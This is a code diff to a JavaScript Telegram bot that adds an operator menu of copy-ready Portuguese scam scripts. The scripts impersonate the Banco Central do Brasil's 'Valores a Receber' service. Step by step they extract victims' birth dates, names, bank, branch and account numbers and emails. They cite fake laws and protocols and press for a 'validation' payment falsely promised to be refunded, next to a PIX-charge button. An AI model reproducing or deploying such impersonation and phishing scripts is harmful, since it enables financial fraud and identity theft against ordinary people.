@@ -1411,10 +1411,177 @@ async function startTelegramPolling() {
               [{ text: "💳 Liberar Etapa 4", callback_data: `etapa:4:${chatId}` }, { text: "✨ Finalizar (Etapa 5)", callback_data: `etapa:5:${chatId}` }],
               [{ text: "📊 Enviar Status", callback_data: `cmd:send_status:${chatId}` }],
               [{ text: "💰 GERAR PIX (COBRAR)", callback_data: `cmd:last_pix` }],
+              [{ text: "📜 Copiar Roteiros / Scripts", callback_data: `painel:scripts:${chatId}` }],
               [{ text: "⬅️ Voltar para Lista", callback_data: "painel:fila" }]
             ]
           };
           await sendTelegram(txt, msgId, kb);
+        }
+        else if (text.startsWith("painel:scripts:")) {
+          const chatId = cb.data.split(":")[2];
+          const txt = `📜 <b>ROTEIROS DE ATENDIMENTO MANUAL</b>\n` +
+            `Lead: <code>${chatId}</code>\n\n` +
+            `Escolha qual parte do roteiro deseja copiar:`;
+            
+          const kb = {
+            inline_keyboard: [
+              [
+                { text: "👋 Etapa 1 (Data)", callback_data: `script:e1:${chatId}` },
+                { text: "👤 Etapa 1.2 (Nome)", callback_data: `script:e12:${chatId}` }
+              ],
+              [
+                { text: "🏦 Etapa 1.3 (Banco)", callback_data: `script:e13:${chatId}` },
+                { text: "💳 Etapa 1.4 (Conta)", callback_data: `script:e14:${chatId}` }
+              ],
+              [
+                { text: "📧 Etapa 1.5 (E-mail)", callback_data: `script:e15:${chatId}` },
+                { text: "👤 Início Manual", callback_data: `script:inicio:${chatId}` }
+              ],
+              [
+                { text: "✅ Etapa 2 Concluída", callback_data: `script:e2ok:${chatId}` },
+                { text: "🔐 Etapa 3 (Vínculo)", callback_data: `script:e3:${chatId}` }
+              ],
+              [
+                { text: "💳 Etapa 4 (Homologado)", callback_data: `script:e4:${chatId}` },
+                { text: "✨ Etapa 5 (Final)", callback_data: `script:e5:${chatId}` }
+              ],
+              [
+                { text: "⬅️ Voltar ao Controle", callback_data: `painel:lead_control:${chatId}` }
+              ]
+            ]
+          };
+          await sendTelegram(txt, msgId, kb);
+        }
+        else if (text.startsWith("script:")) {
+          const parts = cb.data.split(":");
+          const scriptId = parts[1];
+          const chatId = parts[2];
+          
+          let scriptContent = "";
+          let title = "";
+          
+          if (scriptId === "e1") {
+            title = "👋 ETAPA 1 (Data de Nascimento/Abertura)";
+            scriptContent = `<b>Pessoa Física (CPF):</b>\n` +
+              `<code>👋 *Olá! Sou o assistente oficial do Portal de Valores.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):</code>\n\n` +
+              `<b>Pessoa Jurídica (CNPJ):</b>\n` +
+              `<code>🏢 *Portal de Valores — Atendimento Empresarial*\n\nIdentificamos ativos financeiros pendentes vinculados ao CNPJ informado em nosso sistema.\n\nPara prosseguir com a validação da titularidade jurídica, necessitamos confirmar os dados cadastrais da empresa.\n\n📍 *ETAPA 1:* Informe a *Data de Abertura* da empresa (Ex: 10/05/2005):</code>`;
+          } else if (scriptId === "e12") {
+            title = "👤 ETAPA 1.2 (Nome/Razão Social)";
+            scriptContent = `<b>Pessoa Física (CPF):</b>\n` +
+              `<code>✅ *Data de nascimento confirmada!*\n\n📍 *FASE 1.2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):</code>\n\n` +
+              `<b>Pessoa Jurídica (CNPJ):</b>\n` +
+              `<code>✅ *Data de abertura confirmada!*\n\n📍 *FASE 1.2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):</code>`;
+          } else if (scriptId === "e13") {
+            title = "🏦 ETAPA 1.3 (Banco e Agência)";
+            scriptContent = `<b>Solicitar Nome do Banco:</b>\n` +
+              `<code>✅ *Nome Completo confirmado!*\n\n📍 *FASE 1.3:* Informe o *Nome da sua Instituição Financeira* (Ex: Nubank, Itaú, Caixa, Banco do Brasil, Bradesco, etc):</code>\n\n` +
+              `<b>Solicitar Agência (Após Banco identificado):</b>\n` +
+              `<code>🏦 Banco identificado: *Nubank* ✅\n\nAgora informe os números da sua *Agência* bancária:</code>`;
+          } else if (scriptId === "e14") {
+            title = "💳 ETAPA 1.4 (Conta e Confirmação)";
+            scriptContent = `<b>Solicitar Conta com Dígito:</b>\n` +
+              `<code>✔️ *Agência confirmada*\n\nAgora informe o número da sua *Conta* com dígito:</code>\n\n` +
+              `<b>Confirmar Dados do Recebimento:</b>\n` +
+              `<code>🏛️ *NUBANK CONFIRMADO* ✅\n\n📍 *DADOS CAPTURADOS:*\n- Agência: 0001\n- Conta: 123456-7\n- Instituição: Nubank\n\nPrezado(a) titular, confirme se realmente esta é a conta que o senhor(a) deseja utilizar para o recebimento do seu valor ativo?\n\n⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas.\n\n*Responda SIM para confirmar* ou informe os dados novamente.</code>`;
+          } else if (scriptId === "e15") {
+            title = "📧 ETAPA 1.5 (E-mail para Comprovante)";
+            scriptContent = `<code>✅ *Dados bancários confirmados!*\n\n📍 *FASE 1.5 — Canal de Comunicação:* Para que o sistema envie seu *Comprovante de Liberação* e a *Notificação de Regularização* após o resgate, informe seu melhor *E-mail* para contato:\n\n📌 *Exemplo:* seuemail@provedor.com</code>`;
+          } else if (scriptId === "inicio") {
+            title = "👤 INÍCIO MANUAL (Boas-vindas operador)";
+            scriptContent = `<code>🔐 *PORTAL DE VALORES — SISTEMA DE VALORES A RECEBER*\n` +
+              `*Departamento de Liberação de Ativos Financeiros*\n` +
+              `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+              `Prezado(a) Titular,\n\n` +
+              `Informamos que a partir deste momento o(a) senhor(a) está sendo atendido(a) diretamente por um *Operador Especializado do Departamento Jurídico-Financeiro* do Portal de Valores, vinculado ao Banco Central do Brasil, em conformidade com a *Lei Complementar nº 105/2001* e a *Resolução BCB nº 4.862/2020*.\n\n` +
+              `Seu processo de liberação de ativos financeiros pendentes encontra-se devidamente registrado em nosso sistema federal e aguarda a conclusão das etapas obrigatórias de validação, conforme previsto na legislação vigente.\n\n` +
+              `📋 *ETAPAS OBRIGATÓRIAS PARA LIBERAÇÃO:*\n\n` +
+              `*1ª Etapa — Autenticação de Identidade:* ✅ Concluída\n` +
+              `Validação dos dados cadastrais do titular perante os registros do Banco Central do Brasil.\n\n` +
+              `*2ª Etapa — Validação Jurídica do Processo:* 🔄 Em andamento\n` +
+              `Análise e homologação do pedido de resgate junto ao Departamento de Ativos Não Reclamados.\n\n` +
+              `*3ª Etapa — Confirmação do Canal de Recebimento:* ⏳ Pendente\n` +
+              `Verificação e habilitação da conta de destino para transferência dos valores resgatados.\n\n` +
+              `*4ª Etapa — Liberação e Transferência dos Valores:* ⏳ Pendente\n` +
+              `Processamento final e crédito dos ativos financeiros na conta indicada pelo titular.\n\n` +
+              `⚠️ *IMPORTANTE:* Todas as etapas são *obrigatórias e insubstituíveis*, conforme determina o protocolo de segurança do Sistema de Valores a Receber (SVR). A não conclusão de qualquer etapa *suspende automaticamente* o processo de resgate, podendo resultar no bloqueio permanente dos valores a serem recebidos.\n\n` +
+              `Nosso operador responsável conduzirá o(a) senhor(a) pelas próximas etapas de forma segura, sigilosa e dentro dos prazos legalmente estabelecidos.\n\n` +
+              `_Contamos com sua colaboração e compreensão._\n\n` +
+              `*Portal de Valores — Banco Central do Brasil*\n` +
+              `*CNPJ: 00.038.166/0001-05*\n` +
+              `_Este canal é monitorado e possui validade jurídica._</code>`;
+          } else if (scriptId === "e2ok") {
+            title = "✅ ETAPA 2 CONCLUÍDA (Validação Jurídica)";
+            scriptContent = `<code>🔐 *PORTAL DE VALORES — SISTEMA DE VALORES A RECEBER*\n` +
+              `*Departamento de Liberação de Ativos Financeiros*\n` +
+              `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+              `Prezado(a) Titular,\n\n` +
+              `✅ *A Validação Jurídica do seu processo foi concluída com êxito.*\n\n` +
+              `Nosso operador especializado confirmou a titularidade e a autenticidade dos seus dados perante o Departamento de Ativos Não Reclamados do Banco Central do Brasil.\n\n` +
+              `📋 *STATUS ATUALIZADO DAS ETAPAS:*\n\n` +
+              `✅ 1ª Etapa — Autenticação de Identidade: *CONCLUÍDA*\n` +
+              `✅ 2ª Etapa — Validação Jurídica do Processo: *CONCLUÍDA*\n` +
+              `⏳ 3ª Etapa — Confirmação do Canal de Recebimento: *PENDENTE*\n` +
+              `⏳ 4ª Etapa — Liberação e Transferência dos Valores: *PENDENTE*\n\n` +
+              `Nosso operadorará continuidade ao processo em instantes. Permaneça disponível.\n\n` +
+              `*Portal de Valores — Banco Central do Brasil*\n` +
+              `_Este processo possui registro jurídico e validade legal._</code>`;
+          } else if (scriptId === "e3") {
+            title = "🔐 ETAPA 3 (Validação e Vínculo)";
+            scriptContent = `<code>🔐 *ETAPA 3 — VALIDAÇÃO E HABILITAÇÃO DA CONTA DE DESTINO*\n` +
+              `*Departamento de Segurança Financeira — Portal de Valores*\n` +
+              `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+              `Prezado(a) Titular,\n\n` +
+              `Para garantir a integridade da transferência dos seus ativos, o sistema exige a realização de um procedimento de *Validação de Vínculo Bancário*. \n\n` +
+              `⚠️ *ESCLARECIMENTO:* Este procedimento *NÃO* é uma transação comercial, mas sim uma autenticação obrigatória da conta bancária que irá receber os valores. O protocolo gera um *Vínculo de Segurança* entre o Banco Central e sua conta.\n\n` +
+              `📋 *DADOS DO PROTOCOLO DE VALIDAÇÃO:*\n\n` +
+              `🔹 *Protocolo:* #VAL-SVR-CONFIRM\n` +
+              `🔹 *Validade:* 15 Minutos (Expirável)\n` +
+              `🔹 *Finalidade:* Habilitação de canal para recebimento de ativos.\n\n` +
+              `✅ *REEMBOLSO IMEDIATO:* Assim que a validação for processada pelo sistema, o valor utilizado para autenticação será *ESTORNADO INSTANTANEAMENTE* para sua conta, somado ao valor total dos seus ativos recuperados.\n\n` +
+              `O sistema processará o estorno de forma automática via PIX em até 60 segundos após a confirmação do protocolo.\n\n` +
+              `Aguarde o envio das instruções de validação (Código Hash de Autenticação).\n\n` +
+              `*Portal de Valores — Banco Central do Brasil*\n` +
+              `_Processo regido pela Resolução BCB nº 318/2023._</code>`;
+          } else if (scriptId === "e4") {
+            title = "💳 ETAPA 4 (Protocolo Homologado)";
+            scriptContent = `<code>🔐 *PROTOCOLO DE SEGURANÇA HOMOLOGADO*\n` +
+              `*Departamento de Rastreamento de Ativos — SVR*\n` +
+              `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+              `Prezado(a) Titular,\n\n` +
+              `Informamos que o seu *Protocolo Privado de Segurança* foi gerado com êxito pelo sistema federal de ativos.\n\n` +
+              `🖥️ *STATUS DO SISTEMA:*\n` +
+              `\`\`\`\n` +
+              `ID: #SVR-PROT-OK\n` +
+              `STATUS: PRONTO_PARA_USO\n` +
+              `TYPE: CHAVE_HASH_CRIPTOGRAFADA\n` +
+              `VINCULO: ATIVO\n` +
+              `\`\`\`\n\n` +
+              `✅ O código enviado anteriormente representa o seu link de autenticação segura. Assim que a integração for detectada pela rede bancária, o processo avançará automaticamente para a fase de crédito final.\n` +
+              `⚠️ *ATENÇÃO:* Permaneça nesta tela. O sistema está monitorando a validação do hash em tempo real. Assim que concluído, o montante total será liberado.\n\n` +
+              `*Portal de Valores — Banco Central do Brasil*</code>`;
+          } else if (scriptId === "e5") {
+            title = "✨ ETAPA 5 (Resgate Concluído)";
+            scriptContent = `<code>✨ *PROTOCOLO FINALIZADO — RESGATE CONCLUÍDO* ✨\n` +
+              `*Departamento de Execução Financeira — Portal de Valores*\n` +
+              `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+              `Prezado(a) Titular,\n\n` +
+              `Informamos que o seu processo de resgate foi *100% HOMOLOGADO E FINALIZADO* com sucesso.\n\n` +
+              `📋 *DETALHES DO CRÉDITO:*\n\n` +
+              `🔹 *ID Transação:* #SVR-PIX-RELEASE\n` +
+              `🔹 *Status:* CONCLUÍDO\n` +
+              `🔹 *Tipo:* TRANSFERÊNCIA PRIORITÁRIA (TED/PIX)\n` +
+              `🔹 *Prazo para Crédito:* Imediato (Dependendo da compensação interna do seu banco)\n\n` +
+              `✅ O montante total foi liberado e já se encontra em fase de processamento bancário para crédito na sua conta informada. \n\n` +
+              `Agradecemos por utilizar os canais oficiais do Banco Central do Brasil para a recuperação de seus ativos financeiros.\n\n` +
+              `*Portal de Valores — Banco Central do Brasil*\n` +
+              `_Processo 100% Homologado e Finalizado._</code>`;
+          }
+          
+          const finalTxt = `<b>${title}</b>\n\n${scriptContent}`;
+          await sendTelegram(finalTxt, undefined, {
+            inline_keyboard: [[{ text: "⬅️ Voltar aos Roteiros", callback_data: `painel:scripts:${chatId}` }]]
+          });
         }
         else if (text === "cmd:ping") {
           await sendTelegram("✅ <b>SISTEMA OPERACIONAL</b>\n\nLatência: 42ms\nBanco de Dados: OK\nWhatsApp: OK", msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
